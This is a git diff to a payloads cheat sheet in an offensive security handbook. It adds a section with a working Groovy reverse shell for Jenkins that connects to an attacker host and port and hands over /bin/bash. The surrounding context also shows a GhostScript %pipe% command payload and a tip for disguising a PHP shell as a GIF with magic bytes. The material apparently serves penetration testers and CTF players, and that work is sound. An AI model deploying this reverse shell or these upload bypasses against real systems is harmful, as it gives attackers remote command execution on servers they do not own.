@@ -10,6 +10,7 @@
 - [Exiftool](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Exiftool)
 - [GhostScript](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#GhostScript)
 - [GIF](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#GIF)
+- [Groovy (Jenkins) Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Groovy-Jenkins-Reverse-Shell)
 - [iconv](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#iconf)
 - [JAVA Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#JAVA-Reverse-Shell)
 - [JDWP](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#JDWP)
@@ -122,6 +123,15 @@ mark /OutputFile (%pipe%cat flag > /app/application/static/petpets/flag.txt) cur
 ### Magic Byte
 
 Add `GIF8` on line `1` of for example a php shell to get the file recognized as a gif file. Even when you name it `shell.php`.
+
+## Groovy (Jenkins) Reverse Shell
+
+```c
+String host="<LHOST>";
+int port=<LPORT>;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
 
 ## iconv
 
